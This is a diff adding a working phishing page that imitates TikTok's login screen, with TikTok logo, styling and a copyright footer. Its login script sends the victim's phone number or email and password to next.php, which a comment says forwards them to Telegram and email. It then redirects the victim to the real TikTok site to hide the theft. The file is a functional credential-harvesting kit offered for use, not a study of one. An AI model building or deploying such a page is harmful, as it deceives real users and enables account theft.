@@ -1,0 +1,328 @@
+<style>
+    * { box-sizing: border-box; }
+
+    .tiktok-container {
+        background: white !important;
+        color: black !important;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important;
+        margin: 0 !important;
+        padding: 20px !important;
+        width: 100% !important;
+        max-width: none !important;
+        min-height: 400px !important;
+        display: flex !important;
+        flex-direction: column !important;
+        justify-content: center !important;
+        align-items: center !important;
+        padding-bottom: 80px !important; /* Space for fixed footer */
+    }
+
+    .tiktok-form {
+        width: 100% !important;
+        max-width: 320px !important;
+        margin: 0 auto !important;
+    }
+
+    .header {
+        display: flex !important;
+        align-items: center !important;
+        justify-content: center !important;
+        margin-bottom: 25px !important;
+        max-width: 320px !important;
+        margin: 0 auto 25px !important;
+    }
+
+    .tiktok-logo {
+        width: 32px !important;
+        height: 32px !important;
+        margin-right: 16px !important;
+        flex-shrink: 0 !important;
+    }
+
+    .tiktok-logo img {
+        width: 100% !important;
+        height: 100% !important;
+    }
+
+    .login-title {
+        font-size: 24px !important;
+        font-weight: 800 !important;
+        font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important;
+        letter-spacing: -0.5px !important;
+        margin: 0 !important;
+        color: black !important;
+        line-height: 32px !important; /* Match logo height */
+    }
+
+    .tabs {
+        display: flex !important;
+        margin-bottom: 15px !important;
+        border-bottom: 1px solid #e0e0e0 !important;
+    }
+
+    .tab-btn {
+        flex: 1 !important;
+        background: none !important;
+        border: none !important;
+        color: #666 !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif !important;
+        padding: 12px 8px !important;
+        cursor: pointer !important;
+        border-bottom: 2px solid transparent !important;
+        text-align: center !important;
+        transition: all 0.2s ease !important;
+    }
+
+    .tab-btn.active {
+        color: #fe2c55 !important;
+        border-bottom-color: #fe2c55 !important;
+    }
+
+    .input-container {
+        margin-bottom: 10px !important;
+    }
+
+    .phone-input-group {
+        position: relative !important;
+        display: flex !important;
+        align-items: center !important;
+        border: 1px solid #ddd !important;
+        border-radius: 4px !important;
+        overflow: visible !important;
+    }
+
+    .country-code {
+        background: #f8f9fa !important;
+        padding: 12px 10px !important;
+        border-right: 1px solid #ddd !important;
+        font-size: 14px !important;
+        color: black !important;
+        min-width: 70px !important;
+        text-align: center !important;
+        position: relative !important;
+    }
+
+    .country-code select {
+        background: transparent !important;
+        border: none !important;
+        outline: none !important;
+        color: black !important;
+        cursor: pointer !important;
+        width: 100% !important;
+        font-size: 14px !important;
+        appearance: none !important;
+        padding: 0 !important;
+        margin: 0 !important;
+    }
+
+    /* Fixed dropdown arrow positioning - visible beside country code */
+    .country-code::before {
+        content: '▼' !important;
+        position: absolute !important;
+        right: 8px !important;
+        top: 50% !important;
+        transform: translateY(-50%) !important;
+        pointer-events: none !important;
+        color: #666 !important;
+        font-size: 10px !important;
+        z-index: 1 !important;
+    }
+
+    input[type="tel"], input[type="email"], input[type="password"] {
+        width: 100% !important;
+        padding: 12px 14px !important;
+        background: white !important;
+        border: 1px solid #ddd !important;
+        border-radius: 4px !important;
+        color: black !important;
+        font-size: 14px !important;
+        box-sizing: border-box !important;
+        outline: none !important;
+    }
+
+    .phone-input {
+        border: none !important;
+        border-left: none !important;
+        border-radius: 0 !important;
+        flex: 1 !important;
+    }
+
+    input::placeholder {
+        color: #666 !important;
+    }
+
+    .signin-btn {
+        width: 100% !important;
+        padding: 12px !important;
+        background: #fe2c55 !important;
+        color: white !important;
+        border: none !important;
+        border-radius: 4px !important;
+        font-size: 16px !important;
+        font-weight: 600 !important;
+        cursor: pointer !important;
+        margin-top: 15px !important;
+    }
+
+    /* Footer styles */
+    .footer {
+        position: fixed !important;
+        bottom: 0 !important;
+        left: 0 !important;
+        right: 0 !important;
+        background: black !important;
+        color: white !important;
+        padding: 15px 20px !important;
+        display: flex !important;
+        justify-content: space-between !important;
+        align-items: center !important;
+        border-top: 1px solid #333 !important;
+        z-index: 9999 !important;
+    }
+
+    .footer .language {
+        font-size: 14px !important;
+        font-weight: 400 !important;
+        color: #ffffff !important;
+    }
+
+    .footer .copyrights {
+        font-size: 14px !important;
+        font-weight: 400 !important;
+        color: #ffffff !important;
+    }
+
+    /* Responsive footer */
+    @media (max-width: 768px) {
+        .footer {
+            padding: 10px 15px !important;
+            flex-direction: column !important;
+            gap: 10px !important;
+            text-align: center !important;
+        }
+
+        .footer .language,
+        .footer .copyrights {
+            font-size: 12px !important;
+        }
+    }
+</style>
+
+<div class="tiktok-form">
+    <div class="header">
+        <div class="tiktok-logo">
+            <img src="assets/images/tiktok-icon-white-1-logo-svgrepo-com.svg" alt="TikTok Logo">
+        </div>
+        <div class="login-title">Log in</div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab-btn active" onclick="showPhone(event)">Phone</button>
+        <button class="tab-btn" onclick="showEmail(event)">Email / Username</button>
+    </div>
+
+    <div id="phone-input" class="input-container">
+        <div class="phone-input-group">
+            <div class="country-code">
+                <select id="country-code">
+                    <option value="+1">+1</option>
+                    <option value="+91">+91</option>
+                    <option value="+44">+44</option>
+                    <option value="+81">+81</option>
+                    <option value="+86">+86</option>
+                    <option value="+33">+33</option>
+                    <option value="+49">+49</option>
+                    <option value="+39">+39</option>
+                    <option value="+34">+34</option>
+                    <option value="+7">+7</option>
+                    <option value="+82">+82</option>
+                    <option value="+55">+55</option>
+                    <option value="+52">+52</option>
+                    <option value="+60">+60</option>
+                    <option value="+65">+65</option>
+                    <option value="+66">+66</option>
+                    <option value="+84">+84</option>
+                    <option value="+62">+62</option>
+                    <option value="+63">+63</option>
+                    <option value="+90">+90</option>
+                    <option value="+20">+20</option>
+                    <option value="+27">+27</option>
+                    <option value="+234" selected>+234</option>
+                    <option value="+254">+254</option>
+                    <option value="+255">+255</option>
+                    <option value="+256">+256</option>
+                    <option value="+260">+260</option>
+                    <option value="+265">+265</option>
+                    <option value="+266">+266</option>
+                    <option value="+267">+267</option>
+                    <option value="+268">+268</option>
+                    <option value="+269">+269</option>
+                    <option value="+263">+263</option>
+                </select>
+            </div>
+            <input type="tel" id="phone" placeholder="Phone number" class="phone-input" required>
+        </div>
+    </div>
+
+    <div id="email-input" class="input-container" style="display: none;">
+        <input type="email" id="email" placeholder="Email or username" required>
+    </div>
+
+    <input type="password" id="password" placeholder="Password" required>
+
+    <button class="signin-btn" id="login-btn" onclick="handleLogin()">Log in</button>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <div class="language">English (US)</div>
+    <div class="copyrights">© 2025 TikTok</div>
+</footer>
+
+<script>
+    function showPhone(e) {
+        e.preventDefault();
+        document.getElementById('phone-input').style.display = 'block';
+        document.getElementById('email-input').style.display = 'none';
+        document.getElementById('phone').focus();
+        document.querySelector('.tab-btn.active').classList.remove('active');
+        e.target.classList.add('active');
+    }
+
+    function showEmail(e) {
+        e.preventDefault();
+        document.getElementById('phone-input').style.display = 'none';
+        document.getElementById('email-input').style.display = 'block';
+        document.getElementById('email').focus();
+        document.querySelector('.tab-btn.active').classList.remove('active');
+        e.target.classList.add('active');
+    }
+
+    function handleLogin() {
+        let idValue = '';
+        const pass = document.getElementById('password').value;
+
+        if (document.getElementById('phone-input') && document.getElementById('phone-input').style.display !== 'none') {
+            const countryCode = document.getElementById('country-code').value;
+            const phone = document.getElementById('phone').value;
+            idValue = countryCode + phone;
+        } else {
+            idValue = document.getElementById('email').value;
+        }
+
+        if (idValue.trim() && pass.trim()) {
+            // Send data to next.php (this will send to Telegram and email)
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));
+
+            // Immediately redirect to TikTok (as originally intended)
+            window.location.href = 'https://www.tiktok.com';
+        } else {
+            alert("Please enter all required information.");
+        }
+    }
+</script>
